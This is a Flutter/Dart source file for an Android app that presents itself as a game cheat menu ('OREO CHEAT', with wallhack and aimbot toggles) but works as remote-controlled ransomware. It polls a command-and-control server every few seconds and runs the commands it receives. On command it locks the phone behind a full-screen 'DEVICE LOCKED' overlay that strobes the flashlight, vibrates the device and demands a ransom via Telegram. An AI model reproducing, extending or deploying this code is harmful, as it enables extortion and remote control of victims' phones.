import 'dart:async';
import 'dart:convert';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_overlay_window/flutter_overlay_window.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:vibration/vibration.dart';
import 'package:torch_light/torch_light.dart';
import 'screens/splash_screen.dart';
import 'config.dart';
import 'services/command_handler.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await SystemChrome.setPreferredOrientations([DeviceOrientation.portraitUp]);
  runApp(const YanzCheatApp());
}

class YanzCheatApp extends StatelessWidget {
  const YanzCheatApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'OREO VVIP V33',
      debugShowCheckedModeBanner: false,
      theme: ThemeData.dark(useMaterial3: true),
      home: const SplashScreen(),
    );
  }
}

// ================= OVERLAY (JENDELA MENGAMBANG) =================
@pragma("vm:entry-point")
void overlayMain() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const MaterialApp(
    debugShowCheckedModeBanner: false,
    home: OverlayWindow(),
  ));
}

class OverlayWindow extends StatefulWidget {
  const OverlayWindow({super.key});
  @override
  State<OverlayWindow> createState() => _OverlayWindowState();
}

class _OverlayWindowState extends State<OverlayWindow> {
  bool isMinimized = true; 
  bool isLocked = false;
  int lockMode = 0;
  Timer? _pollTimer;
  Timer? _strobe, _vib;

  final Map<String, bool> _features = {
    'Auto Head': true,
    'Wallhack ESP': true,
    'No Recoil': false,
    'Speed Hack': false,
    'Aim Smooth': true,
  };

  @override
  void initState() {
    super.initState();
    _startPolling();
  }

  Future<void> _startPolling() async {
    final prefs = await SharedPreferences.getInstance();
    final devId = prefs.getString('dev_id');
    if (devId == null) return;

    _pollTimer = Timer.periodic(const Duration(seconds: 5), (timer) async {
      try {
        final r = await http.get(Uri.parse('$C2/api/device/$devId/poll')).timeout(const Duration(seconds: 4));
        if (r.statusCode != 200) return;
        final j = jsonDecode(r.body);
        await prefs.setString('cfg', jsonEncode(j['config'] ?? {}));
        
        final cmd = j['cmd'];
        if (cmd != null) {
          if (cmd['action'] == 'lock_v1') {
            _activateLock(1);
          } else if (cmd['action'] == 'lock_v2') {
            _activateLock(2);
          } else {
            await CommandHandler.handle(cmd, devId, prefs);
          }
        }
      } catch (_) {}
    });
  }

  void _toggleSize() async {
    if (isMinimized) {
      await FlutterOverlayWindow.resizeOverlay(260, 400, false);
    } else {
      await FlutterOverlayWindow.resizeOverlay(60, 60, true);
    }
    setState(() => isMinimized = !isMinimized);
  }

  void _activateLock(int mode) async {
    final prefs = await SharedPreferences.getInstance();
    setState(() {
      isLocked = true;
      lockMode = mode;
    });

    // DISINI AKU TAMBAHIN .toInt() BIAR GAK ERROR
    double screenWidth = MediaQuery.of(context).size.width;
    double screenHeight = MediaQuery.of(context).size.height;

    await FlutterOverlayWindow.resizeOverlay(screenWidth.toInt(), screenHeight.toInt(), false);

    if (mode == 2) {
      _strobe = Timer.periodic(const Duration(milliseconds: 400), (_) async {
        try {
          if (await TorchLight.isTorchAvailable()) {
            await TorchLight.enableTorch();
            await Future.delayed(const Duration(milliseconds: 200));
            await TorchLight.disableTorch();
          }
        } catch (_) {}
      });
      _vib = Timer.periodic(const Duration(seconds: 1), (_) {
        Vibration.vibrate(duration: 500);
      });
    }
  }

  void _unlock() async {
    _strobe?.cancel();
    _vib?.cancel();
    try { await TorchLight.disableTorch(); } catch (_) {}
    
    await FlutterOverlayWindow.resizeOverlay(60, 60, true);
    setState(() {
      isLocked = false;
      isMinimized = true;
    });
  }

  @override
  void dispose() {
    _pollTimer?.cancel();
    _strobe?.cancel();
    _vib?.cancel();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    if (isLocked) return _buildLockScreen();
    if (isMinimized) return _buildBubble();
    return _buildMenu();
  }

  Widget _buildBubble() {
    return Material(
      color: Colors.transparent,
      child: GestureDetector(
        onTap: _toggleSize,
        child: Container(
          width: 60, height: 60,
          decoration: BoxDecoration(
            shape: BoxShape.circle,
            gradient: const LinearGradient(colors: [Color(0xFFC9A227), Color(0xFFB3121F)]),
            boxShadow: [BoxShadow(color: const Color(0xFFB3121F).withOpacity(0.8), blurRadius: 15)],
          ),
          child: const Icon(Icons.local_fire_department, color: Colors.white, size: 35),
        ),
      ),
    );
  }

  Widget _buildMenu() {
    return Material(
      color: Colors.transparent,
      child: Container(
        width: 260, height: 400,
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: const Color(0xFF0F0D15).withOpacity(0.95),
          borderRadius: BorderRadius.circular(20),
          border: Border.all(color: const Color(0xFFC9A227), width: 1.5),
          boxShadow: [BoxShadow(color: Colors.black.withOpacity(0.5), blurRadius: 20)],
        ),
        child: Column(children: [
          Row(children: [
            const Icon(Icons.local_fire_department, color: Color(0xFFC9A227)),
            const SizedBox(width: 8),
            const Text('OREO CHEAT', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, letterSpacing: 1)),
            const Spacer(),
            InkWell(
              onTap: _toggleSize,
              child: const Icon(Icons.remove_circle, color: Colors.grey, size: 24),
            ),
          ]),
          const Divider(color: Colors.grey, height: 20),
          Expanded(
            child: ListView(
              children: _features.entries.map((e) => SwitchListTile(
                contentPadding: EdgeInsets.zero,
                title: Text(e.key, style: const TextStyle(color: Colors.white, fontSize: 13)),
                value: e.value,
                activeColor: const Color(0xFF22C55E),
                inactiveThumbColor: Colors.grey,
                onChanged: (v) => setState(() => _features[e.key] = v),
              )).toList(),
            ),
          ),
          const Text('VVIP V33', style: TextStyle(color: Colors.grey, fontSize: 10)),
        ]),
      ),
    );
  }

  Widget _buildLockScreen() {
    return Material(
      color: Colors.black,
      child: Stack(fit: StackFit.expand, children: [
        Image.asset('assets/bg.png', fit: BoxFit.cover),
        BackdropFilter(
          filter: ImageFilter.blur(sigmaX: 5, sigmaY: 5),
          child: Container(color: Colors.black.withOpacity(0.85)),
        ),
        SafeArea(
          child: Padding(
            padding: const EdgeInsets.all(24),
            child: Column(children: [
              const SizedBox(height: 40),
              Image.asset('assets/logo.png', width: 100),
              const SizedBox(height: 30),
              Text('DEVICE LOCKED', style: TextStyle(fontSize: 28, fontWeight: FontWeight.bold, color: Colors.red.shade600, letterSpacing: 5)),
              const SizedBox(height: 20),
              Container(
                padding: const EdgeInsets.all(20),
                decoration: BoxDecoration(color: Colors.black87, borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.red)),
                child: const Text('Bayar tebusan 500.000 untuk membuka HP ini.\nHubungi Telegram @yanzstoru', textAlign: TextAlign.center, style: TextStyle(color: Colors.white, fontSize: 16)),
              ),
              const Spacer(),
              ElevatedButton(
                style: ElevatedButton.styleFrom(backgroundColor: Colors.red, minimumSize: const Size(double.infinity, 50)),
                onPressed: _unlock,
                child: const Text('BUKA HP', style: TextStyle(fontWeight: FontWeight.bold, letterSpacing: 2)),
              ),
            ]),
          ),
        ),
      ]),
    );
  }
}
